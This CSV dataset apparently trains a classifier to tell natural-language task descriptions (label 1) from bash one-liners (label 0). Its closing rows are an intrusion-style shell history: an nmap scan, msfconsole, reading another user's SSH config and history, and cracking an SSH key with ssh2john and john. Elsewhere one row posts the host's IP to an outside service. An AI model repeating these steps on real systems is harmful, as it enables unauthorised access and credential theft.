value,target
"tmpfile=$(mktemp $(dirname ""$1"")/XXXXXX)",0
"create 6-letter named temporary file in a folder path $file1, and save the path to it in a variable 'tmpfile'",1
"tmpfile=$(mktemp $(dirname ""$file1"")/XXXXXX)",0
"create 6-letter named temporary file in a folder path $file1, and save the path to it in a variable 'tmpfile'",1
"tmpfile=$(mktemp $(dirname ""$file1"")/XXXXXX)",0
TMPDIR=$(mktemp -p /tmp -d .daemonXXXXXXX),0
creates temporary folder and save path to that in a TMPDIR variable.,1
TMPDIR=$(mktemp -d),0
TMPDIR=$(mktemp -p /tmp -d .daemonXXXXXXX),0
TMPDIR=$(mktemp -p /tmp -d .daemonXXXXXXX),0
"save the current time formatted according to the format string ""%Y-%m-%d %H:%M:%S"" to the variable 'CDATE'",1
"CDATE=$(date ""+%Y-%m-%d %H:%M:%S"")",0
"save the current working directory to variable ""CURRENT""",1
CURRENT=`pwd`,0
DIR=`pwd`/`dirname $0`,0
vim <(history),0
"save the current user name in variable ""myvariable""",1
myvariable=$(whoami),0
"save the current date, system host name, and ""$changes"" with newlines removed to variable ""subj""",1
"subj=""$(date) - $(hostname) - $(echo ""$changes"" | sed ""s/$/,/"" | tr ""\n"" "" "")""",0
"Save the current working directory with resolved symbolic links to variable ""real1""",1
real1=$(pwd -P),0
$sudo chown root file.sh,0
DATE=$(echo `date`),0
"save the contents of ""numbers.txt"" to variable ""f""",1
f=$(cat numbers.txt),0
"Save the canonical path of ""/usr/bin/java"" with ""/bin/java"" removed to variable ""JAVA_HOME""",1
"JAVA_HOME=$(readlink -f /usr/bin/java | sed ""s:/bin/java::"")",0
"save the canonical path of ""$dir/$file"" in variable ""path""",1
"path=`readlink --canonicalize ""$dir/$file""`",0
Trim leading and trailing whitespace from variable 'var'.,1
"var=`echo $var | awk '{gsub(/^ +| +$/,"""")}1'`",0
extract_dir=$(tar -tf $FILE | cut -d/ -f1 | uniq),0
save the date 222 days before today to the variable 'date_222days_before_TodayDay',1
"date_222days_before_TodayDay=$(date --date=""222 days ago"" +""%d"")",0
"takes folder name of file $0, changes backslashes to forward ones and saves result in $basedir variable.",1
find md5sum of 401,1
yosemite$ echo -n 401 | md5,0
"save the directory name of the current bash script to variable ""path"" if it is found in one of the directories specified by PATH.",1
"path=""$( dirname ""$( which ""$0"" )"" )""",0
HOSTZ=$( hostname | cut -d. -f1 ),0
"save the first three octets of the current host's IP address to variable ""local""",1
"local=$(hostname -I | awk '{print $2}' | cut -f1,2,3 -d""."")",0
"save the first three octets of the host name's IP address to variable ""subnet""",1
"subnet=$(hostname -i | cut -d. -f1,2,3)",0
"save the first two letters of the system host name to variable ""DC""",1
"DC=`hostname | cut -b1,2`",0
"save the first word of the first difference in "".dir_list_2"" compared to "".dir_list_1"" into variable ""extract_dir""",1
extract_dir=$(diff .dir_list_1 .dir_list_2 | grep '>' | head -1 | cut -d' ' -f2),0
"proc_load_average=`w | head -1 | cut -d"" "" -f13 | cut -d"","" -f1-2 | tr ',' '.'`",0
"full_f=""$(which f)""",0
"save the full path of command ""oracle"" to variable ""path""",1
path=`which oracle`,0
reads=$(zcat $file.fastq),0
"save the full path of command ""~/f"" to variable ""foo""",1
foo=`which ~/f`,0
"Save the day of the year from the time string ""20131220"" to variable 'DATECOMING'",1
"DATECOMING=$(echo `date -d ""20131220"" +%j`)",0
"script=""`readlink -f ""${BASH_SOURCE[0]}""`""",0
STAMP=`date -r file_name`,0
DayOfWeek=`date +%a |tr A-Z a-z`,0
"save hexadecimal byte 10 in binary file ""file.moi"" to variable ""day""",1
day=$(od -t x1 --skip-bytes=9 --read-bytes=1 file.moi | head -1 | awk '{print $2}'),0
month=$(od -t x1 --skip-bytes=8 --read-bytes=1 file.moi | head -1 | awk '{print $2}'),0
year=$(od -t x2 --skip-bytes=6 --read-bytes=2 file.moi | head -1 | awk '{print $2}'),0
"save host name in variable ""thisHOSTNAME""",1
thisHOSTNAME=`hostname`,0
save in QUEUE_PIDS variable only pid numbers that stored in $NEW_PIDS variable,1
"QUEUE_PIDS=$(comm -23 <(echo ""$NEW_PIDS"" | sort -u) <(echo ""$LIMITED_PIDS"" | sort -u) | grep -v '^$')",0
"results=$(groups ""$line"" | tr ' ' '\n' | egrep -v ""_unknown|sciences|everyone|netaccounts"")",0
listing=$(ls -l $(cat filenames.txt)),0
"cnt=`ps -ef| tee log | grep ""cntps""|grep -v ""grep"" | wc -l`",0
save number of lines in '/some/big/file' to 'LINES' variable,1
LINES=$(cat /some/big/file | wc -l),0
"r=""$(uname -r)""",0
save number of lines in 'file.txt' file in 'nbLines' variable,1
nbLines=$(cat -n file.txt | tail -n 1 | cut -f1 | xargs),0
save number of lines with any-cased 'merge' from $COMMIT_EDITMSG file in 'MERGE' variable,1
MERGE=$(cat $COMMIT_EDITMSG|grep -i 'merge'|wc -l),0
save number of processors in system to 'NP' variable,1
NP=`cat /proc/cpuinfo | grep processor | wc -l`,0
"big_lines=`cat foo.txt | grep -c ""$expression""`",0
myVar=$(tee),0
"Find the file ""foo.txt"" in the current folder and assign the output to a variable",1
OUTPUT=`find . -name foo.txt`,0
uname_m=`uname -m`,0
Search for all the files in the current folder which start with gen and end with bt2 and assign the output list to the variable var.,1
"var=""$(find . -name 'gen*.bt2')""",0
fhost=`hostname -f`,0
search for all the files having spaces in the current folder and save the output to the variable founddata,1
"founddata=`find . -name ""filename including space"" -print0`",0
"save the FQDN host name of the system in variable ""hnd""",1
hnd=$(hostname -f),0
save the UTC date represented by time string $sting2 as the seconds since epoch to variable 'FinalDate',1
"FinalDate=$(date -u -d ""$string2"" +""%s"")",0
"save the absolute path of ""$path"" to variable ""full_path""",1
full_path=`readlink -fn -- $path`,0
"fullpath=`readlink -f ""$path""`",0
SELF=$(readlink /proc/$$/fd/255),0
search all the files in the current folder and assign them to a variable,1
files=`find .`,0
Remove all the core files in the current directory,1
"/bin/find -name ""core"" — exec rm {} \;",0
print number of jobs,1
n_jobs=$( jobs -p | awk '{print NR}' ),0
"save the absolute path of the current script to variable ""SELF""",1
SELF=`readlink /proc/$$/fd/255`,0
"actual_path=$(readlink -f ""${BASH_SOURCE[0]}"")",0
"ver=`echo -ne ""$1\n$2"" |sort -Vr |head -n1`",0
v=5 env|less,0
"save the latest modification time (in format ""%T@ %t"" of any file under ""./$dir"" to variable ""timestamp""",1
"timestamp=$(find ./$dir -type f -printf ""%T@ %t\\n"" | sort -nr -k 1,2 | head -n 1)",0
"set variable ""architecture"" to machine architecture, ie. x86_64",1
"architecture=""$(uname -m)""",0
saves folder path where target of symbolic link $file file is located in 'base' variable.,1
base=$(dirname $(readlink $file)),0
"host=$(dig +short -x ""${ip_address}"" | sed 's/\.$//g')",0
"result=$(groups ""$line"" | sed 's/ /\n/g' | egrep -v ""_unknown|sciences|everyone|netaccounts"")",0
saves index number of file 'script.sh' in the 'inode' variable.,1
"inode=`ls -i ./script.sh | cut -d"" "" -f1`",0
check_script_call=$(history |tail -1|grep myscript.sh ),0
"userlist=$(w|awk 'BEGIN{ORS="",""}NR>2{print $1}'|sed 's/,$//' )",0
a=`w|cut -d' ' -f1`;,0
Saves list of logged in users in system together with 'USER' header in the 'b' variable.,1
b=`w|cut -d' ' -f1`;,0
Saves listing of a current folder in 'OUTPUT' variable.,1
"OUTPUT=""$(ls -1)""",0
Saves listing of a current folder in 'var' variable.,1
var=$(ls -l),0
"dir_context=$(dirname -- ""$1"")",0
"Set variable GZIP to the full path of command ""gzip""",1
"GZIP=""$(which gzip)""",0
tmp=$(w | awk '{print $1}'),0
BZIP2_CMD=`which bzip2`,0
n_max=`ls . | wc -l`,0
Set variable 'rav' to the contents of 'var' spelled backwards.,1
rav=$(echo $var | rev),0
saves space separated content of $RAW_LOG_DIR in FILES variable,1
"Set variable 'file' to the base name of first argument to script or function, that is the part following the last slash.",1
"MYUSERS=`grep $MYGROUP /etc/group | cut -d "":"" -f4| tr "","" ""\n""`",0
"PS1=""`hostname`:\!>""",0
"PROMPT_COMMAND='LAST=""`cat /tmp/x`""; exec >/dev/tty; exec > >(tee /tmp/x)'",0
"file=$( basename ""$1"" )",0
"set the bash prompt to ""username@hostname""",1
"PS1=""`whoami`@`hostname | sed 's/\..*//'`""",0
"Set the environment variable ""DISPLAY"" to the system host name followed by "":0 skype""",1
DISPLAY=`hostname`:0 skype,0
PS1=`hostname`':\W> ',0
fname=`basename $f`,0
"PS4='+$(date ""+%s:%N"") %N:%i> '",0
"filename=""`basename ""http://pics.sitename.com/images/191211/pic.jpg""`""",0
"PS4='+ $(date ""+%s.%N"")\011 '",0
Saves file sctipt.sh size in 'size' variable.,1
size=`cat script.sh | wc -c`,0
Saves date of the first Sunday in month $mo of year $yo in the 'do' variable.,1
do=$(cal -m $mo $yo|awk 'NR>2&&!/^  /{print$1;exit}'),0
OS=$(uname -s),0
"HOSTNAME=""`hostname`""",0
"save the line number matching ""}]"" in lines starting with ""item_1"" to ""item_2"" in ""itemlist.json"" to variable ""line_to_be_replaced""",1
"line_to_be_replaced=`cat itemlist.json | nl |  sed -n '/""item_1""/,/""item_2""/p' | grep -in ""}]"" | awk '{print $2}'`",0
"save the logical current working directory to variable ""basedir""",1
basedir=$(pwd -L),0
save the md5 sum of $twofish to variable 'twofish',1
"twofish=`echo -n $twofish | md5sum | tr -d ""  -""`",0
"Save the number of bytes in ""$file"" after decompression into variable ""size""",1
"size=""$(zcat ""$file"" | wc -c)""",0
candidates=$(which -a $cmd | wc -l),0
server_id=`hostname | tr 'A-Za-z-.' ' ' | tr -d '[[:space:]]' | awk '{print NR}'`,0
set variable value to current kernel release name.,1
value=$(uname -r),0
"save the numerically greater value of ""$kf"" and ""$mp"" into variable ""gv""",1
gv=$(echo -e $kf'\n'$mp | sort -t'.' -g | tail -n 1),0
"Save the percentage of packets lost of the 5 packets sent to ""$host"" in variable ""packet_loss""",1
packet_loss=$(ping -c 5 -q $host | grep -oP '\d+(?=% packet loss)'),0
"Save the physical current working directory to variable ""END_ABS""",1
END_ABS=`pwd -P`,0
WORKSTATION_IP=`dig +short $WORKSTATION`,0
"DBPREFIX=""$(hostname -s).mysqldb""",0
"Save the short system host name to variable ""hostname""",1
set variable PacketLoss to first digit of percentage of packet loss occurring when pinging host specified by TestIP,1
"PacketLoss=$(ping ""$TestIP"" -c 2 | grep -Eo ""[0-9]+% packet loss"" | grep -Eo ""^[0-9]"")",0
"saves calendar of $month, $year in the 'cal' variable.",1
"cal=$(echo $(cal ""$month"" ""$year""))",0
"save the system host name into variable ""HOST""",1
HOST=$(hostname),0
myHostName=`hostname`,0
"save full path of command ""rm"" to variable ""RM""",1
RM=`which rm`,0
"set variable PING to 1 if it's possible to ping host ADDRESS, to 0 otherwise.",1
PING=$(ping ADDRESS -c 1 | grep -E -o '[0-9]+ received' | cut -f1 -d' '),0
OS=`uname -s`,0
"save the user name of the current user to variable ""me""",1
"me=""$(whoami)""",0
me=$(whoami),0
"Save the user name of the current user to variable ""whoami""",1
whoami=$(whoami),0
"save the user name of the current user to variable ""x""",1
x=$(whoami),0
saves 'tmux' version in the 'tmux_version' variable.,1
"tmux_version=""$(tmux -V | cut -c 6-)""",0
saves byte size of $myvar variable value in the 'var2' variable.,1
var2=$(echo $myvar | wc -c),0
saves byte size of all content of $1 folder in 'uiTotalSize' variable.,1
uiTotalSize=$(ls -l -R $1 | grep -v ^d | awk '{total+=$5;} END {print total;}'),0
Saves bytes count of the value of '$each' variable.,1
a=$(echo $each | wc -c),0
"save full path of command ""tr"" to variable ""TR""",1
TR=`which tr`,0
creates temporary file and saves path to it in 'fif2' variable.,1
fif2=$(mktemp -u),0
MKTEMP=`which mktemp`,0
"collapse double slashes in variable ""dir"" into a single one.",1
"dir=""`echo $dir | sed s,//,/,g`""",0
"FILES=$(find $FILES_PATH -type f -name ""*"")",0
"full_backup_dir=""`find . -depth -print0`""",0
find all files in current directory that were modified less than 1 day ago excluding hidden files  and archive them and put the output into the variable file_changed,1
file_changed=$(find . -depth \( -wholename \./\.\* \) -prune -o -mtime -1 -print | cpio -oav),0
"Find all files in current directory excluding hidden files, archive them and put the output into variable  full_backup_dir",1
"full_backup_dir=""$(find . -depth \( -wholename \./\.\* \) -prune -o -print | cpio -oav)""",0
"check if 'nullglob' shell option is enabled, and if so, saves its status in 'is_nullglob' variable.",1
is_nullglob=$( shopt -s | egrep -i '*nullglob' ),0
clear,0
"DST=`dirname ""${SRC}""`/`basename ""${SRC}"" | tr '[A-Z]' '[a-z]'`",0
Convert the content of variable 'CLEAN' to small letters,1
CLEAN=`echo -n $CLEAN | tr A-Z a-z`,0
"execute python script ""test.py"" with ""LD_PRELOAD=./linebufferedstdout.so"" and write the output to console and append to ""test.out""",1
LD_PRELOAD=./linebufferedstdout.so python test.py | tee -a test.out,0
"Execute all arguments to a shell script and write the output to console and ""$FILE""",1
$@ | tee $FILE,0
"DATA=$( find ""${1}"" -type f -exec ${MD5} {} ';' | sort -n )",0
"evaluate the output of recursively changing the owner and group of ""/data/*"" to ""mongodb""",1
`sudo chown -R mongodb:mongodb /data/*`,0
"g=`dirname ""$f""`/`basename ""$f"" | tr '[A-Z]' '[a-z]'`",0
"Compress ""hello world"" and save to variable ""hey""",1
"hey=$(echo ""hello world"" | gzip -cf)",0
"check if ""\[$VLABEL\]"" is mounted and save the result in variable ""AMV""",1
"AMV=$(mount -l | grep ""\[$VLABEL\]"")",0
"Calculates process depth of process with id $processid, and stores it in a 'depth' variable.",1
depth=$(pstree -sA $processid | head -n1 | sed -e 's#-+-.*#---foobar#' -e 's#---*#\n#g' -eq | wc -l),0
"x=$(grep ""$(dirname ""$path"")"" file)",0
Finds files in 'directory' folder with the same name and location but different content than files in 'directory.original' folder and saves location of such files to 'directories' variable.,1
directories=$(diff -qr directory directory.original | cut -d' ' -f2 | xargs dirname | uniq),0
Finds name of a current month and saves it in a 'month' variable.,1
"month=$(cal | head -1 | grep -oP ""[A-Za-z]+"")",0
"finds only parts of echoed string that match with regex 'run-parts (-{1,2}\S+ )*\S+', and saves them in $match variable, each matched part on a separate line.",1
"match=$(echo ""${line}"" | egrep -o 'run-parts (-{1,2}\S+ )*\S+')",0
"Finds the folder where temporary files would be written to, and save path to it in a 'TMPDIR' variable.",1
TMPDIR=`dirname $(mktemp -u -t tmp.XXXXXXXXXX)`,0
USERS=$(w | awk '/\/X/ {print $1}'),0
USERS=$(awk '/\/X/ {print $1}' <(w)),0
calculate the md5 checksum of the current directory structure and save it in variable SUM,1
SUM=$(tree | md5sum),0
"format the time string $timestamp according to the format string ""%Y-%m-%d %H:%M:%S"" and save the output to variable 'CDATE'",1
"CDATE=$( date -d @""$timestamp"" +""%Y-%m-%d %H:%M:%S"" )",0
VARIABLENAME=$(date -d @133986838),0
generate a random 32 ASCII character password from /dev/urandom and save it to variable 'pass',1
pass=$(LC_CTYPE=C < /dev/urandom tr -cd [:graph:] | tr -d '\n' | fold -w 32 | head -n 1),0
"generates default-formatted file name of temporary file in a /dev/mapper folder, and saves path to it in a variable 'MAPPER'.",1
MAPPER=$(mktemp -up /dev/mapper),0
"generates name for temporary file with 6-letter suffix, and saves path to that new file in 'fn' variable.",1
fn=$(mktemp -u -t 'XXXXXX'),0
tFile=$(mktemp --tmpdir=/dev/shm),0
fifo_name=$(mktemp -u -t fifo.XXXXXX),0
"Compresses all files listed in array $*, executing in background.",1
compress $* &,0
var1=`echo $var1 | tr '[A-Z]' '[a-z]'`,0
"Save full path of command ""cat"" to variable ""CAT""",1
CAT=`which cat`,0
Creates temporary file in default folder and saves path to it in 'source' variable.,1
source=`mktemp`,0
Creates temporary file with name formatted like 'emacs-manager.XXXXXX' in '/tmp/' folder and saves path to it in 'tmp_file' variable.,1
tmp_file=`mktemp --tmpdir=/tmp emacs-manager.XXXXXX`,0
creates temporary file with name formatted like '.script.XXXXXX' in '/tmp/' folder and saves path to it in 'script2' variable.,1
script2=`mktemp /tmp/.script.XXXXXX`;,0
creates temporary file with name formatted like '.script.XXXXXX' in '/tmp/' folder and saves path to it in 'script1' variable.,1
script1=`mktemp /tmp/.script.XXXXXX`;,0
"creates temporary file with file name formatted like /tmp/gnuplot_cmd_$(basename ""${0}"").XXXXXX.gnuplot and saves path to it in a variable 'gnuplotscript'.",1
"gnuplotscript=$(mktemp /tmp/gnuplot_cmd_$(basename ""${0}"").XXXXXX.gnuplot)",0
creates temporary file with appended suffix '.cmd' and saves path to it in 'LGT_TEMP_FILE' variable.,1
"LGT_TEMP_FILE=""$(mktemp --suffix .cmd)""",0
creates temporary file name and saves path to it in 'TMP_FILE' variable.,1
"TMP_FILE=""$(mktemp -t)""",0
"Creates temporary file in a current folder with name formatted like 'templateXXXXXX', and saves path to it in 'tempfile' variable.",1
tempfile=$(mktemp $(pwd)/templateXXXXXX),0
count number of A records of domain '$domain' on nameserver '$server' and save value in 'result' variable,1
"result=""$(dig +short @""$server"" ""$domain"" | wc -l)""",0
Creates temporary file in a current folder and saves path to it in 'f' variable.,1
f=`mktemp -p .`,0
"tempFile=""$(mktemp ""${TMPDIR:-/tmp/}$(basename ""$0"")-XXXXX"")""",0
"Creates temporary file in TMPDIR folder or /tmp/ if TMPDIR is not defined, named by template ${tempname}.XXXXXX, and saves path to new file in  a TMPPS_PREFIX variable.",1
"TMPPS_PREFIX=$(mktemp ""${TMPDIR:-/tmp/}${tempname}.XXXXXX"")",0
"creates temporary file in $appdir variable with name formatted like expression in variable ${template}, and saves path to it in 'launcherfile' variable.",1
"launcherfile=$(mktemp -p ""$appdir"" ""$template"")",0
creates temporary file and saves path to it in 'content_dir2' variable.,1
tmpfile=`mktemp`,0
"creates temporary file with name formatted like expression in variable ${PROG}, and saves path to it in 'mytemp' variable.",1
"mytemp=""$(mktemp -t ""${PROG}"")""",0
creates temporary folder and saves path to it in 'other' variable.,1
"other=""$(mktemp --directory)""",0
creates temporary folder and saves path to it in 'td' variable.,1
td=$( mktemp -d ),0
creates temporary folder and saves path to it in a 'tempd' variable.,1
tempd=`mktemp -d`,0
dir=$(mktemp -d),0
Creates temporary file and saves path to it in 'content_dir1' variable.,1
content_dir1=$(mktemp),0
"mydir=$(mktemp -d ""${TMPDIR:-/tmp/}$(basename $0).XXXXXXXXXXXX"")",0
rsync_src=`mktemp -d -p $mnt_dir`,0
"tdir=""$(pwd)/$(mktemp -d)""",0
COLUMN=`echo $1 | tr -d -`,0
creates temporary directory in '/tmp/' folder and saves path to it in 'my_tmp_dir' variable.,1
my_tmp_dir=$(mktemp -d --tmpdir=/tmp),0
creates random file name formatted like expression in variable ${str// /X} and saves it in 'rand_str' variable.,1
rand_str=$(mktemp --dry-run ${str// /X}),0
creates file by template 'aws-sync-XXXXX' in a current folder and stores file name in a 'dir' variable.,1
"dir=""$(mktemp aws-sync-XXXXX)""",0
Creates 5-letter random file name and saves it in 'rand_str' variable.,1
"rand_str=""$(mktemp --dry-run XXXXX)""",0
ab=`ps -ef | grep -v grep | grep -wc processname`,0
"tmp=$(mktemp -d $(dirname ""$1"")/XXXXXX)",0
Counts number of processors and saves in variable NUMCPU.,1
NUMCPU=$(grep $'^processor\t*:' /proc/cpuinfo |wc -l),0
Get directory listing of URL $1 and save them to variable 'header' by deleting '\r' characters,1
"header=""$(curl -sI ""$1"" | tr -d '\r')""",0
get domain name of $ip and save it to the variable 'reverse',1
reverse=$(dig -x $ip +short),0
Gets IP address of ${NET_IF} network interface.,1
NET_IP=`ifconfig ${NET_IF} | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`,0
represent time string $MOD_DATE as seconds since epoch and save to variable 'MOD_DATE1',1
"MOD_DATE1=$(date -d ""$MOD_DATE"" +%s)",0
myvar=`seq 1 $N | sed 's/.*/./' | tr -d '\n'`,0
"sSH into ""localhost"" with forced pseudo-terminal allocation, execute ""$heredoc"", and save the output to variable ""REL_DIR""",1
"REL_DIR=""$(ssh -t localhost ""$heredoc"")""",0
"run command specified by $line, replace space (' ') with newline and save the output to variable 'arr'",1
"arr=$( $line | tr "" "" ""\n"")",0
nohup rm -rf cache &,0
Returns exit status 0.,1
foo=$(false)$(true),0
TESTVAR=bbb env | fgrep TESTVAR,0
"TODAY=$(date  -d ""$(date +%F)"" +%s)",0
Gets IP address of 'en1' network interface.,1
my_ip=$(ifconfig en1 | grep 'inet addr' | awk '{print $2}' | cut -d: -f 2),0
"represent the UTC date given in time string ""1970.01.01-$string1"" as number of seconds since the epoch and save it in 't1' variable",1
"t1=$(date -u -d ""1970.01.01-$string1"" +""%s"")",0
timestamp=`date --rfc-3339=seconds`,0
"replace all spaces (' ') with comma (',') in ${TO_IGNORE[@]}, append with '--ignore ' and save the resultant string to variable 'ARGS'",1
"ARGS=""--ignore `echo ${TO_IGNORE[@]} | tr ' ' ','`""",0
"removestr=$(echo ""$list"" | tr "":"" ""\n"" | grep -m 1 ""^$removepat\$"")",0
Removes first and last parts of path $path and saves the result in 'finalName' variable.,1
finalName=$(dirname ${path#*/}),0
Remove the path $1 from the PATH environment variable,1
"PATH=$(echo $PATH | tr "":"" ""\n"" | grep -v $1 | tr ""\n"" "":"")",0
"save IP address of your SSH session in variable ""WORKSTATION""",1
WORKSTATION=`who -m|awk '{print $5}'|sed 's/[()]//g'`,0
"save Java home in variable ""JAVA_HOME""",1
"JAVA_HOME=""$( readlink -f ""$( which java )"" | sed ""s:bin/.*$::"" )""",0
FOLDERS=`ls -dm $MY_DIRECTORY/*/ | tr -d ' '`,0
tmpfile=$(mktemp),0
"files=""$(find $dir -perm 755)""",0
"save a nginx link to ""/path/to/file"" with the current user and system FQDN host name in variable ""path""",1
"path=""http://$(whoami).$(hostname -f)/path/to/file""",0
RAND=`od -t uI -N 4 /dev/urandom | awk '{print $2}'`,0
"bgxjobs="" $(jobs -pr | tr '\n' ' ')""",0
"save a unique list of the currently logged in usernames to variable ""line""",1
line=$(who | cut -d' ' -f1 | sort -u),0
"Save absolute path of ""/home/nohsib/dvc/../bop"" in variable ""absolute_path""",1
absolute_path=$(readlink -m /home/nohsib/dvc/../bop),0
"MY_PATH=$(readlink -f ""$0"")",0
"save absolute path of the script filename in variable ""SCRIPT""",1
"SCRIPT=""$(readlink --canonicalize-existing ""$0"")""",0
"Save actual working directory in variable ""target_PWD""",1
target_PWD=$(readlink -f .),0
Save all entries that are wrapped around with opening and closing square brackets in file 'FILENAME' to variable 'var',1
var=`egrep -o '\[.*\]' FILENAME | tr -d ][`,0
"totalLineCnt=$(cat ""$file"" | grep ""$filter"" | grep -v ""$nfilter"" | wc -l | grep -o '^[0-9]\+');",0
address=$(dig +short google.com | grep -E '^[0-9.]+$' | head -n 1),0
Save first one of space separated parts of each line in $LOCKFILE file to the 'CURRENT_PID_FROM_LOCKFILE' variable,1
"CURRENT_PID_FROM_LOCKFILE=`cat $LOCKFILE | cut -f 1 -d "" ""`",0
"remove symbolic links and get absolute path of ""${the_stuff_you_test}"" and save to variable ""DIR_PATH""",1
"DIR_PATH=`readlink -f ""${the_stuff_you_test}""`",0
"remove duplicates in variable ""variable"" and preserve the order",1
"variable=$(echo ""$variable"" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)",0
"Remove a leading ""machine"" from the system host name and save the result to variable ""machnum""",1
machnum=$(hostname | sed 's/^machine//'),0
"calculate md5 checksum of $KEY, take the 1st to 10th character, append them with the string '/tmp/command_cache.' and save the rsultant string to variable FILE",1
"FILE=""/tmp/command_cache.`echo -n ""$KEY"" | md5sum | cut -c -10`""",0
gets IP addresses of all active network interfaces and saves to 'ip' variable.,1
"ip=$(ifconfig | grep -oP ""(?<=inet addr:).*?(?=Bcast)"")",0
gets domain name from dig reverse lookup and save in variable 'go'.,1
go=$(dig -x 8.8.8.8| awk '/PTR[[:space:]]/{print $NF}'),0
Gets state of shell option 'dotglob' and saves it in 'rest_cmd' variable.,1
rest_cmd=$(shopt -p dotglob),0
"VAR=`dig axfr @dc1.localdomain.com localdomain.com | grep -i Lawler | awk '{ getline ; $1=substr($1,1,length($1)-1); print $1 ; exit }'`",0
interpret backslash sequences and delete whitespace characters in variable $FOO and save the result to variable 'FOO_NO_WHITESPACE',1
"FOO_NO_WHITESPACE=""$(echo -e ""${FOO}"" | tr -d '[[:space:]]')""",0
calculate md5 sum of file ${my_iso_file} and save it to variable 'md5',1
"md5=""$(md5sum ""${my_iso_file}"")""",0
List content of 'myfile' in a subshell and returns output to parent shell,1
$(cat myfile),0
list jobs and their process ids and print them by replacing newline with '^',1
"joblist=$(jobs -l | tr ""\n"" ""^"")",0
zless MyFile,0
Calculate md5 checksum of theDirname,1
cpio -i -e theDirname | md5sum,0
look up for 'myip.opendns.com' in server 'resolver1.opendns.com' and save the terse output in 'IP' variable,1
IP=$(dig +short myip.opendns.com @resolver1.opendns.com),0
"wget --post-data=""PiIP=$(hostname -I)"" http://dweet.io/dweet/for/cycy42",0
checksum=`md5sum /etc/localtime | cut -d' ' -f1`,0
"md5=$(echo ""$line""|md5sum)",0
"KEY+=`date -r ""$arg"" +\ %s`",0
"remove ""-"" from the contents of ""/proc/sys/kernel/random/uuid"" and save output to variable ""comment""",1
comment=$(cat /proc/sys/kernel/random/uuid | sed 's/\-//g'),0
popd,0
"PROMPT_COMMAND='echo ""$(date +""%Y/%m/%d (%H:%M)"") $(history 1 |cut -c 7-)"" >> /tmp/trace'",0
"gcc -print-search-dirs | sed '/^lib/b 1;d;:1;s,/[^/.][^/]*/\.\./,/,;t 1;s,:[^=]*=,:;,;s,;,;  ,g' | tr \; \\012",0
~ $ . trap.sh | cat,0
Print revesed second from the end dot-bounded field in $i value,1
"j=`echo $i | rev | cut -d ""."" -f2`;",0
append the current date to variable 'LBUFFER',1
"LBUFFER+=""$(date)""",0
"name=""$(date +'%d%m%Y-%H-%M')_$(whoami)""",0
print the output of history without line numbers,1
"history|awk '{$1="""";print substr($0,2)}'",0
whoami,0
prints directory where the executing script ($0) is located.,1
`dirname $0`,0
"$(readlink -f $(dirname ""$0""))",0
append the current date in '%Y%m%d_%H%M' format with the basename of $0 and save it to variable 'LOGNAME',1
"LOGNAME=""`basename ""$0""`_`date ""+%Y%m%d_%H%M""`""",0
"inarray=$(echo ${haystack[@]} | grep -o ""needle"" | wc -w)",0
Recursively finds all 'STATUS.txt' files containing text 'OPEN' and prints containing folder of them.,1
fgrep --include='STATUS.txt' -rl 'OPEN' | xargs -L 1 dirname,0
"save a line of 100 random characters either ""."" or "" "" in variable ""foo""",1
foo=$(cat /dev/urandom | tr -dc '. ' | fold -w 100 | head -1),0
man nmap,0
nmap -sL 10.1.26.9,0
nmap 10.1.26.9,0
nmap -p 10000,0
nmap -sV -p 10000 10.1.26.9,0
msfconsole,0
cd ..,0
ls,0
cd home,0
cd chong,0
cat READ-ME.txt,0
ls -a,0
cd /home/chong,0
cat .bash_history,0
grep ssh,0
cd ~,0
cat .bash_history | grep ssh,0
cat .ssh,0
cd .ssh,0
cat config,0
su chong,0
ssh lab,0
man john,0
cat Y29yb25h,0
touch peso,0
vim peso,0
cat peso,0
cd /usr,0
cd share,0
cd john,0
python ssh2john.py,0
python ssh2john.py ~/peso,0
python ssh2john.py ~/peso > peso2,0
john peso2 --wordlists=/usr/share/worldlists/fasttrack.txt,0
john peso2 --wordlist=/usr/share/worldlists/fasttrack.txt,0
ls /usr/share/wordlist,0
ls /usr/share/wordlist/,0
ls /usr/share/wordlists/,0
john peso2 --wordlist=/usr/share/wordlists/fasttrack.txt,0
cd research/,0
man grep,0
grep,0
grep cure *,0
grep Cure *,0
cat .cure.data,0
nc localhost 4444,0
nmap -sV 10.1.26.9,0
msf console,0
cat /home/chong/READ-ME.txt,0
sc,0
cd ...,0
cd s,0
cd webmin/,0
cd c,0
cat calendar/,0
.bash_history,0
